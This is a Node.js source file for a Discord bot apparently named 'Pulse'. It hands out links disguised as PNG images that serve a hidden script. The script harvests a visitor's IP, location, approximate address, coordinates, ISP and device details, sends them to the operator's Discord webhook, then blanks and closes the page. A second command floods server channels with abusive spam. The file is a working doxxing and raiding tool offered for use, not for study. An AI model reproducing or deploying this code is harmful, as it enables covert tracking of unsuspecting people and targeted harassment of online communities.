const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

// ---- ENVIRONMENT VARIABLES ----
const TOKEN = process.env.TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const INVITE_LINK = process.env.INVITE_LINK || 'https://discord.gg/hW3djeNKu';
const PORT = process.env.PORT || 3000;

// ---- MINIMAL INTENTS (no MessageContent needed) ----
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ],
});

// ---- STORE ACTIVE LINKS ----
const links = new Map();

// ---- EXPRESS SERVER ----
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    console.log(`🔍 Requested ID: ${id}`);
    console.log(`📦 Current links:`, Array.from(links.keys()));
    
    if (!links.has(id)) {
        console.log(`❌ ID not found: ${id}`);
        res.type('image/png');
        return res.send('Image not found');
    }
    
    console.log(`✅ ID found: ${id}`);
    res.type('text/html');
    res.send(generateDoxHTML());
});

app.listen(PORT, () => {
    console.log(`🌐 Server running on port ${PORT}`);
});

// ---- DISCORD BOT ----
client.once('ready', () => {
    console.log(`🤖 Logged in as ${client.user.tag}`);
    
    const commands = [
        { name: 'dox', description: 'Generate a fresh link' },
        { name: 'raid', description: 'Flood the channel with a raid message' },
        { name: 'invite', description: 'Get an invite link for Pulse' }
    ];
    
    commands.forEach(cmd => {
        client.application.commands.create(cmd)
            .then(() => console.log(`✅ /${cmd.name} registered`))
            .catch(err => console.error(`❌ Failed to register /${cmd.name}:`, err));
    });
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX ----
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });

        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;

        links.set(id, {
            created: Date.now(),
            user: interaction.user.tag
        });

        console.log(`✅ Generated link: ${url}`);
        console.log(`📦 Links stored:`, Array.from(links.keys()));

        const embed = new EmbedBuilder()
            .setTitle('✅ Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their data will be logged here.`)
            .setFooter({ text: 'Expires after 100 links generated' });

        await interaction.editReply({ embeds: [embed] });
    }

    // ---- RAID ----
    if (interaction.commandName === 'raid') {
        await interaction.deferReply({ ephemeral: true });

        const channel = interaction.channel;
        if (!channel) {
            return interaction.editReply('❌ This command can only be used in a server channel.');
        }

        const spamLines = [];
        for (let i = 0; i < 30; i++) {
            spamLines.push('THIS SERVER FUCKING SUCKS PULSE OWNS ALL OF YOU');
        }
        spamLines.push(`Join Pulse today to get this raid: ${INVITE_LINK}`);
        
        const raidMessage = spamLines.join('\n');

        try {
            await channel.send(raidMessage);
            await interaction.editReply('✅ Raid sent successfully.');
        } catch (error) {
            console.error('Raid failed:', error);
            await interaction.editReply('❌ Failed to send raid. Check bot permissions.');
        }
    }

    // ---- INVITE ----
    if (interaction.commandName === 'invite') {
        const embed = new EmbedBuilder()
            .setTitle('📩 Invite Pulse')
            .setColor(0x8B5CF6)
            .setDescription(`[➕ Add Bot to Your Server](https://discord.com/oauth2/authorize?client_id=1545939378361081916)`)
            .setFooter({ text: 'Click the link above to invite' });

        await interaction.reply({ embeds: [embed] });
    }
});

// ---- CLEANUP ----
setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) {
        keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
    }
}, 60000);

// ---- DOX HTML ----
function generateDoxHTML() {
    return `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
    const WEBHOOK_URL = "${WEBHOOK_URL}";
    (async function() {
        try {
            const ipData = await getIPData();
            const ip = ipData.ip || 'N/A';
            const country = ipData.country || 'N/A';
            const region = ipData.region || 'N/A';
            const city = ipData.city || 'N/A';
            const postal = ipData.postal || 'N/A';
            const lat = ipData.lat || 'N/A';
            const lon = ipData.lon || 'N/A';
            const asn = ipData.asn || 'N/A';
            const isp = ipData.isp || 'N/A';
            const addressParts = [city, region, postal, country].filter(p => p && p !== 'N/A');
            const address = addressParts.length > 0 ? addressParts.join(', ') : 'N/A';
            const deviceData = {
                timestamp: new Date().toISOString(),
                ip: ip, country: country, region: region, city: city,
                postal: postal, address: address, lat: lat, lon: lon,
                asn: asn, isp: isp,
                screen: screen.width + 'x' + screen.height,
                browser: getBrowser(navigator.userAgent),
                os: getOS(navigator.userAgent),
                device: getDeviceType(navigator.userAgent),
                battery: await getBatteryInfo(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gpu: getGPUInfo(),
                userAgent: navigator.userAgent
            };
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "☠️ Logged",
                        color: 0xFF0000,
                        fields: [
                            { name: "🌐 IP", value: deviceData.ip || 'N/A', inline: true },
                            { name: "📍 Country", value: deviceData.country || 'N/A', inline: true },
                            { name: "🏙️ City", value: deviceData.city || 'N/A', inline: true },
                            { name: "🗺️ Region", value: deviceData.region || 'N/A', inline: true },
                            { name: "📮 Postal", value: deviceData.postal || 'N/A', inline: true },
                            { name: "🏠 Closest Address", value: deviceData.address || 'N/A', inline: false },
                            { name: "📌 Coordinates", value: deviceData.lat + ', ' + deviceData.lon || 'N/A', inline: true },
                            { name: "🔢 ASN", value: deviceData.asn || 'N/A', inline: true },
                            { name: "🏢 ISP", value: deviceData.isp || 'N/A', inline: true },
                            { name: "📱 Screen", value: deviceData.screen || 'N/A', inline: true },
                            { name: "🧠 Browser", value: deviceData.browser || 'N/A', inline: true },
                            { name: "💻 OS", value: deviceData.os || 'N/A', inline: true },
                            { name: "🖥️ Device", value: deviceData.device || 'N/A', inline: true },
                            { name: "🔋 Battery", value: deviceData.battery || 'N/A', inline: true },
                            { name: "🕒 Timezone", value: deviceData.timezone || 'N/A', inline: true },
                            { name: "🎮 GPU", value: deviceData.gpu || 'N/A', inline: false }
                        ],
                        footer: { text: "Logged at " + deviceData.timestamp }
                    }]
                })
            }).catch(() => {});
        } catch (err) {}
        document.body.innerHTML = '';
        document.body.style.background = '#ffffff';
        document.body.style.margin = '0';
        document.body.style.height = '100vh';
        setTimeout(() => { window.close(); window.location.href = 'about:blank'; }, 1500);
    })();

    async function getIPData() {
        try {
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    postal: data.postal || 'N/A',
                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
                    asn: data.asn || 'N/A',
                    isp: data.org || 'N/A'
                };
            }
        } catch (e) {}
        try {
            const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
            const fallbackData = await fallbackRes.json();
            if (fallbackData.status === 'success') {
                return {
                    ip: fallbackData.query || 'N/A',
                    country: fallbackData.country || 'N/A',
                    region: fallbackData.regionName || 'N/A',
                    city: fallbackData.city || 'N/A',
                    postal: fallbackData.zip || 'N/A',
                    lat: fallbackData.lat || 'N/A',
                    lon: fallbackData.lon || 'N/A',
                    asn: fallbackData.as || 'N/A',
                    isp: fallbackData.isp || 'N/A'
                };
            }
        } catch (e) {}
        return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A' };
    }

    async function getBatteryInfo() {
        try {
            const battery = await navigator.getBattery();
            return Math.round(battery.level * 100) + '%' + (battery.charging ? ' (Charging)' : '');
        } catch { return 'N/A'; }
    }

    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'N/A';
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debug) return 'N/A';
            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        } catch { return 'N/A'; }
    }

    function getDeviceType(ua) {
        if (/mobile|android|iphone|ipad/i.test(ua)) return '📱 Mobile';
        if (/tablet|ipad/i.test(ua)) return '📱 Tablet';
        return '💻 Desktop';
    }

    function getBrowser(ua) {
        if (ua.includes('Edg')) return 'Edge';
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari')) return 'Safari';
        return 'Unknown';
    }

    function getOS(ua) {
        if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
        if (ua.includes('Mac OS X')) return 'macOS';
        if (ua.includes('Android')) return 'Android';
        if (ua.includes('iPhone')) return 'iOS';
        return 'Unknown';
    }
<\/script>
</body>
</html>`;
}

client.login(TOKEN);
